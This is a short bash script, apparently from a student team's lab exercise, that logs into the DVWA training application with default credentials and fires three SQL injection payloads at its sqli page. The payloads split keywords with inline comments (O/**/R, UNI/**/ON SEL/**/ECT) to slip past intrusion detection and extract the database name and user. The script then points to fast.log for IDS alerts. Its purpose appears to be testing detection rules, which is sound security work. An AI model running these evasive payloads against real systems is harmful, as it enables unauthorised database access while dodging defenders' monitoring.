#!/bin/bash

TARGET="${1:-dvwa}"
PORT="80"
COOKIE_FILE="/tmp/dvwa_eq6.txt"

echo "=== Equipe 6 — Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# Auth DVWA
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET:$PORT/login.php" -L -o /dev/null

echo "[*] Cookie recupere"
echo ""

# ─────────────────────────────────────────────────────────────
# Payload 1 — Boolean bypass (sans OR classique)
# ─────────────────────────────────────────────────────────────
echo "[1] Boolean bypass (obfuscation)..."

PAYLOAD="1 O/**/R 1=1"

RESULT=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=${PAYLOAD}&Submit=Submit" \
  -o /dev/null -w "%{http_code}")

echo "    HTTP $RESULT"


# ─────────────────────────────────────────────────────────────
# Payload 2 — UNION SELECT obfusqué
# ─────────────────────────────────────────────────────────────
echo "[2] UNION SELECT bypass..."

PAYLOAD="1 UNI/**/ON SEL/**/ECT 1,2"

RESULT2=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=${PAYLOAD}&Submit=Submit" \
  -o /dev/null -w "%{http_code}")

echo "    HTTP $RESULT2"


# ─────────────────────────────────────────────────────────────
# Payload 3 — Extraction sans mots détectés
# ─────────────────────────────────────────────────────────────
echo "[3] Extraction evasion..."

PAYLOAD="1 UNI/**/ON SEL/**/ECT database(),user()"

RESULT3=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=${PAYLOAD}&Submit=Submit" \
  -o /dev/null -w "%{http_code}")

echo "    HTTP $RESULT3"


echo ""
echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
